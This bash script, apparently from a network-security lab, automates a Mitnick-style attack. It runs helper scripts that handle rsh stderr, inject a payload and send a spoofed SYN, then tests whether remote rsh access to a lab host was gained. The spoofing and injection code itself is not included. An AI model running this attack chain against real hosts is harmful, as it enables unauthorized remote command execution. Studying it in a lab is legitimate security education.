#!/bin/bash

# Mitnick Attack Automation Script

echo "Starting attack..."
echo "Make sure the .rhosts file is configured, the arp cache entry is PERM and the trusted server is stopped!"

# 1) Run the error handler in the background
echo "Starting error handler on port 9090..."
python3 ./rsh_stderr_handler.py > handler.log 2>&1 & # Redirect the error stream (file descriptor 2) at the same place of FD 1. "&" make execute the command in background
PID1=$!
sleep 2

# 2) Run the injector in the background
echo "Starting payload injector..."
python3 ./rsh_payload_injector.py > injector.log 2>&1 &
PID2=$!
sleep 2

# 3) Run the trigger
echo "Sending spoofed SYN..."
python3 ./trigger.py

echo "Waiting for attack to finish..."
sleep 5

# Clean up processes
echo "Killing background scripts..."
kill $PID1
kill $PID2

echo "Done."
echo "Check if it worked: rsh -l seed 10.9.0.5 date"
